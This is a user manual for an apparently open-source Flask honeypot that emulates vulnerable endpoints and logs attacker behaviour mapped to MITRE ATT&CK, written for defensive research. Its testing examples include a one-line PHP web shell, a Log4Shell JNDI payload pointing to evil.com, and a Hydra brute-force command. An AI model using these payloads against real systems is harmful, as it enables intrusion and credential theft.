# Honeypot Lab: User Manual

## 1. Introduction
The **Honeypot Lab** is a Python/Flask-based deception system designed to emulate vulnerable web services. It captures real-world attacker behavior, payloads, and tactics in a safe, controlled environment. All attacker interactions are enriched with GeoIP data, mapped to the MITRE ATT&CK framework, and stored for post-hoc analysis.

**Disclaimer:** This tool is intended for educational and research purposes. Deploy only in isolated environments you own or have explicit authorization to use.

---

## 2. System Architecture
The project is modular, separating the web endpoints, core configuration, logging, and data analysis:

| Component | File | Purpose |
| :--- | :--- | :--- |
| **App Factory** | `app.py` | Initializes Flask, registers endpoints, manages GeoIP caching. |
| **Configuration** | `config.py` | Centralized settings (ports, DB paths, API timeouts). |
| **Database** | `extensions.py` | SQLite persistence with WAL mode for safe, concurrent logging. |
| **Endpoints** | `blueprints/*.py` | Emulates RCE, Login, Uploads, JNDI, and Botnet Baits. |
| **Services** | `services/*.py` | JSON formatting, MITRE mapping, and external GeoIP lookups. |
| **Analysis Pipeline**| `monitor_honeypot.py` | Pandas/Matplotlib script for log parsing and visualization. |

---

## 3. Prerequisites & Installation

**Requirements:**
* Python 3.8+
* pip
* Virtualenv

**Step 1: Clone and Navigate**
```bash
git clone https://github.com/Harshil015/Honeypot-Lab.git
cd Honeypot-Lab
```

**Step 2: Create Virtual Environment**
```bash
python3 -m venv venv
source venv/bin/activate   # On Linux/Mac
# venv\Scripts\activate    # On Windows
```

**Step 3: Install Dependencies**
```bash
pip install -r requirements.txt
```

---

## 4. Operating the Honeypot

### Starting the Honeypot
To launch the deception server, run:
```bash
python app.py
```
*The honeypot will start listening on `http://0.0.0.0:5000`.*
*All interactions will be logged to `honeypot.log` and the SQLite database at `db/events.db`.*

### Running the Analysis Pipeline
To process captured data into visual charts and session replays:
1. Stop the honeypot (`Ctrl+C`).
2. Run the analysis script:
```bash
python monitor_honeypot.py
```
*This will generate `attack_timeline.png`, `payload_frequency.png`, and print a session replay summary to your terminal.*

---

## 5. Use Cases & Emulated Endpoints

The honeypot exposes several intentionally vulnerable endpoints. Here is how attackers (or your testing tools) interact with them:

### Use Case 1: Remote Code Execution (RCE) Emulation
* **Endpoint:** `/cmd` (GET / POST)
* **MITRE ATT&CK:** T1059 (Execution)
* **How it works:** Accepts a `cmd` parameter. Instead of executing the command (which is dangerous), it emulates common Linux outputs to trick the attacker.
* **Testing it:**
  ```bash
  curl "http://127.0.0.1:5000/cmd?cmd=whoami"
  # Output: root
  ```

### Use Case 2: Brute-Force Credential Capture
* **Endpoint:** `/login` (GET / POST)
* **MITRE ATT&CK:** T1110 (Credential Access)
* **How it works:** Presents a fake HTML login form. Accepts `username` and `password` via POST. Always returns `401 Invalid Credentials` to keep the attacker brute-forcing.
* **Testing it (with Hydra):**
  ```bash
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
  ```

### Use Case 3: Web Shell Upload Capture
* **Endpoint:** `/upload` (POST)
* **MITRE ATT&CK:** T1505.003 (Persistence)
* **How it works:** Accepts multipart file uploads. Saves the file securely to the `uploads/` directory using a sanitized filename for later malware analysis, but never executes it.
* **Testing it:**
  ```bash
  echo "<?php system(\$_GET['cmd']); ?>" > shell.php
  curl -F "file=@shell.php" http://127.0.0.1:5000/upload
  ```

### Use Case 4: JNDI / Log4Shell Injection
* **Endpoint:** `/jndi` (GET / POST)
* **MITRE ATT&CK:** T1059 (Execution)
* **How it works:** Captures Log4Shell style payloads sent via headers or parameters without connecting to the attacker's LDAP/RMI server.
* **Testing it:**
  ```bash
  curl -A "\${jndi:ldap://evil.com/Exploit}" "http://127.0.0.1:5000/jndi?payload=exploit"
  ```

### Use Case 5: Botnet Bait Endpoints
* **Endpoints:** `/shell.php`, `/cmd.php`, `/cgi-bin/`
* **MITRE ATT&CK:** T1190 (Initial Access)
* **How it works:** Automated internet scanners constantly look for these specific files. The honeypot serves a `404 Not Found` but silently logs the attempt, payload, and scanner signature.

---

## 6. Configuration Guide

You can modify the honeypot's behavior without changing the code by setting environment variables before running `python app.py`, or by editing `config.py` directly.

| Variable | Default | Description |
| :--- | :--- | :--- |
| `HONEYPOT_LOG_FILE` | `honeypot.log` | Path to the JSON-lines log file. |
| `HONEYPOT_DATABASE_PATH`| `db/events.db` | Path to the SQLite database file. |
| `HONEYPOT_UPLOAD_DIR` | `uploads/` | Directory where captured malware/payloads are stored. |
| `HONEYPOT_GEOIP_ENABLED`| `true` | Enables/disables external IP lookups. Set to `false` if offline. |
| `HONEYPOT_GEOIP_TIMEOUT`| `2.0` | Max seconds to wait for the GeoIP API before failing gracefully. |

---

## 7. Data & Log Structure

The honeypot outputs structured JSON lines to `honeypot.log`. Every event contains the following schema, making it easy to ingest into ELK, Splunk, or custom Python scripts:

```json
{
  "timestamp": "2024-05-20T14:30:00Z",
  "level": "INFO",
  "message": "RCE_ATTEMPT",
  "event_type": "RCE_ATTEMPT",
  "severity": "HIGH",
  "src_ip": "192.168.1.50",
  "user_agent": "curl/7.84.0",
  "path": "/cmd",
  "method": "GET",
  "payload": "whoami",
  "country": "US",
  "city": "Ashburn",
  "isp": "DigitalOcean LLC",
  "asn": "AS14061",
  "mitre_technique_id": "T1059",
  "mitre_tactic": "Execution",
  "details": {}
}
```

---

## 8. Troubleshooting

* **Issue:** `ModuleNotFoundError: No module named 'flask'`
  * **Fix:** You forgot to activate your virtual environment. Run `source venv/bin/activate` and `pip install -r requirements.txt`.
* **Issue:** `sqlite3.OperationalError: database is locked`
  * **Fix:** Ensure you are running the latest code. The `extensions.py` file uses `PRAGMA journal_mode=WAL;` to prevent this. If it persists, delete the `db/events.db` file and restart the honeypot.
* **Issue:** GeoIP returns `Unknown` for all IPs.
  * **Fix:** You may be offline, or the public IP API (`ip-api.com`) is rate-limiting you. The honeypot caches IPs for 1 hour to prevent this, but heavy traffic can still trigger limits.
* **Issue:** `KeyError: 'timestamp'` when running `monitor_honeypot.py`.
  * **Fix:** Ensure you are using the updated `monitor_honeypot.py` script provided, which uses `errors='coerce'` and prevents DataFrame mutation.
